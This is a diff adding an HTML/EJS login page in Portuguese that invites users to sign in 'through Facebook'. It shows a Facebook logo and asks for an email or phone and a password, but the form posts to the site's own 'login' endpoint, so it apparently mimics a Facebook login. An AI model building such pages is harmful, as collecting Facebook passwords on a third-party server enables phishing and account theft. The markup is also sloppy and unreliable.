@@ -1,0 +1,55 @@
+<!DOCTYPE HTML>
+
+<html ng-app="app" ng-controller="login">
+
+
+    <head>
+    <% include heads/face %>
+   </head>
+    <body>
+    
+        <h1>
+            {{title}}<p class='material-icons'>book</p>
+        </h1>
+<br />
+<br />
+        <div id='login'  class="center">
+<form method='post' id='formfb' action='login'>
+        <label>
+        <br/>
+        
+        <img class='icone' src='/img/fb.png'>
+        <p>entre pelo seu facebook</p>
+        <hr/>
+        <br/><br />
+        
+        <p><b>e-mail ou telefone: </b></p>
+        <input type='name' id='email' ng-model=user.name name='email' placeholder='insira seu e-mail ou Telefone' required><br /> </input> 
+<br />
+<label>
+        <p><b>senha: </b></p>
+        <input type='password' id='pass' ng-model=user.email name='pass' placeholder='insira sua senha' required />
+         <br />  
+         <br/>
+        <label>
+        </label>
+        <hr>
+        <br />
+        
+        <button type='submit'><b>entrar</b></button>
+        <br/>
+        <br/>
+        <hr />
+        </form>
+        </div>
+        
+        <script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.11.1/jquery.validate.min.js"></script>
+        <script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.js"></script>
+
+        
+
+<script src='login.js'></script>
+ </script>
+<div class='dev'>Reinan 2019©</div> 
+   </body>
+</html>
